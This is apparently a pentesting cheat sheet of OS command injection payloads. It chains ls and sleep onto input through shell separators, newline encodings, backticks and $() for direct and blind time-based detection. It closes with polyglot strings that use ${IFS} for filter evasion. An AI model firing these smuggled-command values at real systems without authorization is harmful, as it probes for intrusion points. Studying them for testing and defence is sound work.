# normal
```
;ls
||ls;
|ls;
&&ls;
&ls;
%0Als
\nls
`ls`
$(ls)
```


# blind
```
;sleep 10
||sleep 10;
|sleep 10;
&&sleep 10;
&sleep 10;
%0Asleep 10
\nsleep 10
`sleep 10`
$(sleep 10)
```

```
1;sleep${IFS}9; #${IFS}';sleep${IFS}9;                    #${IFS}";sleep${IFS}9;#${IFS}
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5`  #*/-sleep(5)||'"||sleep(5)||"/*`*/
```